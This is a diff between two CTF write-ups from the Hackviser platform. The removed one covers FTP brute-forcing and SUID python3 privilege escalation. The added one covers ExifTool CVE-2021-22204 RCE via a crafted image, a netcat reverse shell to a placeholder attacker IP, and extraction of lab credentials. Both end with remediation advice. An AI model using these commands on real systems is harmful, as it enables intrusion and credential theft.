@@ -1,194 +1,177 @@
-# CTF Write-Up: Create Edge — Orbitronix Systems
+# CTF Write-Up: ExifViewer — CVE-2021-22204 RCE
 
 **Author:** Neelesh Pandey  
 **Platform:** Hackviser  
-**Target:** `createdge.hv`  
-**Category:** Enumeration / Privilege Escalation  
+**Target:** `exifviewer.hv`  
+**Category:** Web Application / Remote Code Execution  
 **Difficulty:** Medium  
+**CVE:** [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)  
 
 ---
 
 ## Objective
 
-Enumerate the Create Edge server to extract confidential information about Orbitronix Systems' marketing campaign:
-
-| # | Flag | Status |
-|---|------|--------|
-| 1 | Advertising budget | Captured |
-| 2 | Target audience | Captured |
-| 3 | Secret marketing tool | Captured |
+Identify and exploit vulnerabilities in the ExifViewer web application to gain remote access and extract sensitive information from the server.
 
 ---
 
 ## Methodology
 
 ```
-Nmap scan → Directory enumeration → FTP brute-force → 
-Web asset analysis → SUID exploitation → Root file access
+Reconnaissance → Vulnerability ID → Payload Generation → 
+Upload & Trigger → Reverse Shell → Post-Exploitation → Data Extraction
 ```
 
 ---
 
 ## 1. Reconnaissance
 
-### 1.1 Nmap Service Scan
+### Directory Enumeration
 
 ```bash
-nmap -sV createdge.hv
+gobuster dir -u http://exifviewer.hv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 **Results:**
 
 ```
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+/assets     → 403 Forbidden
+/index.php  → 200 OK
 ```
 
-**Findings:**
-- FTP (port 21) and HTTP (port 80) both open
-- Target OS: Unix-like (Debian)
-- Two potential attack surfaces identified
+### Application Fingerprinting
+
+Manual interaction with the application revealed:
+
+- **Image upload feature** present on the main page
+- Server processes uploaded image metadata after upload
+- Backend identified as using **ExifTool version 12.23**
+
+> ExifTool 12.23 is publicly known to be vulnerable to **CVE-2021-22204** — a critical RCE via malicious DjVu metadata embedded in image files.
 
 ---
 
-### 1.2 Directory Enumeration
+## 2. Vulnerability Identification
 
-HTTP directory scan against the web server:
+| Detail | Value |
+|--------|-------|
+| Component | ExifTool |
+| Version | 12.23 |
+| CVE | CVE-2021-22204 |
+| Type | Remote Code Execution (RCE) |
+| CVSS Score | 7.8 (High) |
+| Attack Vector | Malicious image metadata processed server-side |
 
-```
-/.htaccess     → 403 Forbidden
-/.htpasswd     → 403 Forbidden
-/assets        → 301 Redirect
-/ftp           → 301 Redirect  ← interesting
-/index.html    → 200 OK
-/vendor        → 301 Redirect
-```
-
-**Findings:** `/ftp` and `/assets` directories accessible — worth investigating further.
-
----
-
-## 2. FTP Enumeration
-
-### 2.1 Credential Discovery via Brute Force
-
-Brute-forced FTP credentials using Hydra with a common wordlist:
-
-```bash
-hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://createdge.hv
-```
-
-**Valid credentials found:**
-
-```
-Username: ftpuser
-Password: password
-```
-
-### 2.2 File Discovery via FTP
-
-Logged in and listed available files:
-
-```bash
-ftp createdge.hv
-# login with ftpuser:password
-ls
-```
-
-**Files found:**
-
-```
-clients.csv
-webshell.php
-```
-
-Extracted `clients.csv` — contained advertising budget data:
-
-| Company Name | Advertising Budget ($) |
-|---|---|
-| Orbitronix Systems | 225,000 |
-
-> **Flag 1 captured:** Advertising budget = **$225,000 USD**
-
-**Note:** Target audience was not present in this file — further enumeration required.
+**How it works:**  
+ExifTool versions before 12.24 fail to safely handle DjVu annotation metadata. A specially crafted image file can embed shell commands in the metadata that get executed when ExifTool processes the file — in this case, triggered by the upload feature.
 
 ---
 
-## 3. Web Assets Enumeration
+## 3. Exploitation
 
-Inspected the `/assets/js` directory:
+### 3.1 Payload Generation
 
-```
-animation.js
-imagesloaded.js
-isotope.js
-owl-carousel.js
-tabs.js
-templatemo-custom.js
-```
+Generated a malicious JPEG with a reverse shell payload embedded in the image metadata using a public PoC exploit for CVE-2021-22204:
 
-Found an additional CSV at `/archive/detailed_client_info.csv` containing extended client data:
+```bash
+# Set up listener first
+nc -lvnp 4444
 
-```
-Orbitronix Systems, 225000, Brand Awareness, Yes, Young Adults, 12
+# Generate malicious image with embedded reverse shell
+python3 exploit.py -ip <attacker-ip> -port 4444
 ```
 
-> **Flag 2 captured:** Target audience = **Young Adults**
+### 3.2 Upload & Trigger
+
+1. Uploaded the malicious image via the web application's upload form
+2. Application passed the file to ExifTool for metadata processing
+3. ExifTool executed the embedded payload on the server
+
+### 3.3 Reverse Shell Received
+
+```bash
+listening on [any] 4444 ...
+connect to [attacker-ip] from exifviewer.hv
+$ whoami
+www-data
+```
+
+> Shell obtained as `www-data` — the web server process user.
 
 ---
 
-## 4. Privilege Escalation — SUID Binary Abuse
+## 4. Post-Exploitation
 
-### 4.1 Meeting File Discovery
+### 4.1 File System Enumeration
 
-Found a restricted directory:
-
-```
-/archive/meetings/orbitronix_system-2023-11-20.txt
-```
-
-File permissions were restricted to `root` — direct read not possible as current user.
-
-### 4.2 SUID Binary Enumeration
-
-Searched for SUID binaries that could be abused for privilege escalation:
+Navigated to the upload directory:
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null | grep -E "python|bash|sh|perl"
+cd /var/www/93c0550a5543b366_uploads
+ls -la
 ```
 
-**Results:**
+**Files discovered:**
 
 ```
-/usr/bin/python3.9      ← exploitable
-/usr/bin/chsh
-/usr/lib/openssh/ssh-keysign
+users.csv
+database.go
+Ja23s6_techinnovations_invoice.pdf
 ```
 
-`/usr/bin/python3.9` had the SUID bit set — this allows executing code as root.
+### 4.2 Credential Extraction
 
-### 4.3 Exploiting SUID Python3
-
-Used the SUID Python3 binary to escalate privileges and read the root-owned file:
+Read `users.csv`:
 
 ```bash
-/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("cat /archive/meetings/orbitronix_system-2023-11-20.txt")'
+cat users.csv
 ```
 
-**File revealed:** Secret marketing tool developed by Create Edge = **InsightNexus AI**
+**Credentials found:**
 
-> **Flag 3 captured:** Secret marketing tool = **InsightNexus AI**
+| Field | Value |
+|-------|-------|
+| Email | salvarado@waltersltd.hv |
+| Password | hGCQjxZs5chK |
+
+### 4.3 Database Configuration
+
+Extracted database connection string from `database.go`:
+
+```bash
+cat database.go
+```
+
+**Connection string:**
+
+```
+postgres://postgres:JS3CqjNCcn7Ve@olympusbytes.hv:5432/olympus
+```
+
+| Field | Value |
+|-------|-------|
+| DB Host | olympusbytes.hv |
+| Port | 5432 |
+| Username | postgres |
+| Password | JS3CqjNCcn7Ve |
+| Database | olympus |
+
+### 4.4 Invoice Analysis
+
+Downloaded and analysed `Ja23s6_techinnovations_invoice.pdf` — extracted invoice number and transaction details from PDF content.
 
 ---
 
 ## 5. Flags Summary
 
-| Flag | Value |
-|------|-------|
-| Orbitronix advertising budget | $225,000 USD |
-| Target audience | Young Adults |
-| Secret marketing tool | InsightNexus AI |
+| Finding | Value |
+|---------|-------|
+| RCE achieved via | CVE-2021-22204 (ExifTool 12.23) |
+| Shell user | www-data |
+| Extracted email | salvarado@waltersltd.hv |
+| Extracted password | hGCQjxZs5chK |
+| DB host | olympusbytes.hv:5432 |
+| DB credentials | postgres / JS3CqjNCcn7Ve |
 
 ---
 
@@ -196,21 +179,19 @@ Used the SUID Python3 binary to escalate privileges and read the root-owned file
 
 | Tool | Purpose |
 |------|---------|
-| `nmap` | Service and port scanning |
-| `gobuster` | HTTP directory enumeration |
-| `hydra` | FTP credential brute-force |
-| `ftp` | File retrieval from FTP server |
-| `find` | SUID binary enumeration |
-| `python3` | Privilege escalation via SUID abuse |
+| `gobuster` | Directory enumeration |
+| `CVE-2021-22204 PoC` | Malicious image payload generation |
+| `netcat (nc)` | Reverse shell listener |
+| `cat / ls` | File system enumeration |
 
 ---
 
 ## 7. Key Takeaways
 
-- **Weak FTP credentials** (`password` as a password) are a critical misconfiguration — always test default and common credentials during assessments
-- **SUID binaries** on non-standard executables like Python are a serious privilege escalation risk; `python3` should never have the SUID bit set in production
-- **Sensitive data in web-accessible directories** (`/ftp`, `/archive`) should be protected behind authentication, not just file permissions
-- A complete CTF methodology flows naturally: port scan → directory enum → credential attack → file analysis → privilege escalation
+- **Unpatched software is critical risk** — ExifTool 12.23 was publicly known to be vulnerable at the time. A simple version update to 12.24+ would have prevented this entire attack chain
+- **File upload features are high-value targets** — any functionality that processes uploaded files server-side must validate file type, content, and never pass untrusted input to external tools without sanitisation
+- **Source code and config files in web-accessible directories** (`database.go`, `users.csv`) expose credentials directly — these should never be stored in the web root
+- **CVE research is a core pentesting skill** — identifying the exact software version and matching it to a known CVE is often faster than finding a zero-day
 
 ---
 
@@ -218,10 +199,17 @@ Used the SUID Python3 binary to escalate privileges and read the root-owned file
 
 | Finding | Risk | Fix |
 |---------|------|-----|
-| Weak FTP password | High | Enforce strong password policy; disable anonymous FTP |
-| SUID on Python3 | Critical | Remove SUID bit: `chmod u-s /usr/bin/python3.9` |
-| Sensitive files in web root | High | Move outside web root or require authentication |
-| FTP service exposed | Medium | Replace FTP with SFTP; restrict by IP |
+| ExifTool 12.23 | Critical | Update to ExifTool 12.24 or later immediately |
+| Credentials in web root | Critical | Move sensitive files outside the web root; use environment variables for DB credentials |
+| Unrestricted file upload | High | Validate file type server-side; strip metadata before processing; sandbox ExifTool execution |
+| www-data access to sensitive files | High | Apply principle of least privilege; web process should not have read access to config files |
+
+---
+
+## References
+
+- [CVE-2021-22204 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
+- [ExifTool Changelog](https://exiftool.org/history.html)
 
 ---
 
